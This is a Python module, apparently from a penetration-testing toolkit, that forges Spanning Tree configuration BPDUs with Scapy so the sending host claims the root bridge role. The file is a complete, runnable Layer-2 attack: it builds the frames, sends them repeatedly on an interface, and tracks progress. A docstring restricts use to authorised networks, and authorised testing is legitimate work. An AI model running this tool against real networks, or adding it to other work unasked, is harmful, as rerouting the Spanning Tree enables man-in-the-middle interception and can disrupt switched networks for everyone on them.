"""BPDU spoofing: inject configuration BPDUs into Spanning Tree.

Spanning Tree (IEEE 802.1D) elects a root bridge from the bridge IDs in the
configuration BPDUs that switches exchange. BPDUs are not authenticated, so a
host that sends one can take part in the election. A BPDU that advertises a
better root (a lower root ID) makes the receiving switch change its root port
and its topology.

This module sends configuration BPDUs that advertise a root bridge chosen by
the operator. The frame layout follows IEEE 802.1D-2004, section 9.3.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import struct
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import Runner, normalize_unicast_mac, read_interface_mac, run_command

STP_MAC = "01:80:c2:00:00:00"       # Bridge group address for STP BPDUs
LLC_STP = bytes.fromhex("424203")   # LLC: DSAP 0x42, SSAP 0x42, control 0x03
MAX_PRIORITY = 61440                # Bridge priority ceiling (multiples of 4096)
PRIORITY_STEP = 4096
MAX_PORT_ID = 0xFFFF
MAX_PATH_COST = 0xFFFFFFFF
DEFAULT_PORT_ID = 0x8001
# BPDU timers are in units of 1/256 second.
MAX_AGE = 20 * 256
HELLO_TIME = 2 * 256
FORWARD_DELAY = 15 * 256


def validate_priority(value: int, name: str = "Priority") -> int:
    """Bridge priorities are 0 to 61440 in steps of 4096."""
    if not 0 <= value <= MAX_PRIORITY or value % PRIORITY_STEP:
        raise ValueError(f"{name} must be a multiple of 4096 between 0 and {MAX_PRIORITY}.")
    return value


@dataclass(frozen=True)
class BpduSpoofingConfig:
    iface: str                          # attacker interface, on the switch port under test
    root_priority: int = 0              # priority of the root bridge advertised (lower wins)
    root_mac: str = ""                  # root bridge MAC; empty = this interface's MAC
    root_path_cost: int = 0             # cost from the advertised root to this bridge
    bridge_priority: int = 0            # priority of the sending bridge ID
    port_id: int = DEFAULT_PORT_ID      # port identifier carried in the BPDU
    count: int = 0                      # BPDUs to send; 0 = run until stopped
    interval: float = 2.0               # seconds between BPDUs (the standard hello time)
    dry_run: bool = False               # build BPDUs but do not send them

    def __post_init__(self) -> None:
        validate_priority(self.root_priority, "Root priority")
        validate_priority(self.bridge_priority, "Bridge priority")
        if self.root_mac:
            normalize_unicast_mac(self.root_mac)
        if not 0 <= self.root_path_cost <= MAX_PATH_COST:
            raise ValueError("Root path cost must fit in 32 bits.")
        if not 0 <= self.port_id <= MAX_PORT_ID:
            raise ValueError("Port ID must fit in 16 bits.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")
        if self.interval < 0:
            raise ValueError("Interval cannot be negative.")


@dataclass
class BpduSpoofingStats:
    sender_mac: str = ""
    root_id: str = ""
    frames: int = 0
    status: str = ""


def _bridge_id(priority: int, mac: str) -> bytes:
    return struct.pack("!H", priority) + bytes.fromhex(normalize_unicast_mac(mac).replace(":", ""))


def bpdu_body(
    root_priority: int,
    root_mac: str,
    root_path_cost: int,
    bridge_priority: int,
    bridge_mac: str,
    port_id: int = DEFAULT_PORT_ID,
) -> bytes:
    """The 35-byte configuration BPDU that follows the LLC header."""
    return (
        struct.pack("!HBBB", 0, 0, 0, 0)                 # protocol ID, version, type (config), flags
        + _bridge_id(root_priority, root_mac)            # root identifier
        + struct.pack("!I", root_path_cost)              # root path cost
        + _bridge_id(bridge_priority, bridge_mac)        # bridge identifier
        + struct.pack("!H", port_id)                     # port identifier
        + struct.pack("!HHHH", 0, MAX_AGE, HELLO_TIME, FORWARD_DELAY)  # message age, timers
    )


def build_bpdu_frame(
    sender_mac: str,
    root_priority: int = 0,
    root_mac: str = "",
    root_path_cost: int = 0,
    bridge_priority: int = 0,
    port_id: int = DEFAULT_PORT_ID,
) -> Packet:
    """Configuration BPDU from `sender_mac` to the STP group address, with an 802.3 length field.

    The sending bridge ID is built from `bridge_priority` and `sender_mac`. The root
    bridge ID defaults to the sender, so a bridge that claims to be the root and
    sends from its own MAC is the simplest form of the attack.
    """
    sender = normalize_unicast_mac(sender_mac)
    body = bpdu_body(
        root_priority,
        root_mac or sender,
        root_path_cost,
        bridge_priority,
        sender,
        port_id,
    )
    payload = LLC_STP + body
    return Ether(src=sender, dst=STP_MAC, type=len(payload)) / Raw(payload)


def run_bpdu_spoofing(
    config: BpduSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[BpduSpoofingStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> BpduSpoofingStats:
    """Send configuration BPDUs until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = BpduSpoofingStats(
            status=(
                f"Dry run: would send configuration BPDUs to {STP_MAC} advertising root priority "
                f"{config.root_priority}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    root_mac = normalize_unicast_mac(config.root_mac) if config.root_mac else sender_mac
    stats = BpduSpoofingStats(
        sender_mac=sender_mac,
        root_id=f"{config.root_priority:04x}.{root_mac}",
    )
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_bpdu_frame(
            sender_mac,
            root_priority=config.root_priority,
            root_mac=root_mac,
            root_path_cost=config.root_path_cost,
            bridge_priority=config.bridge_priority,
            port_id=config.port_id,
        )
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
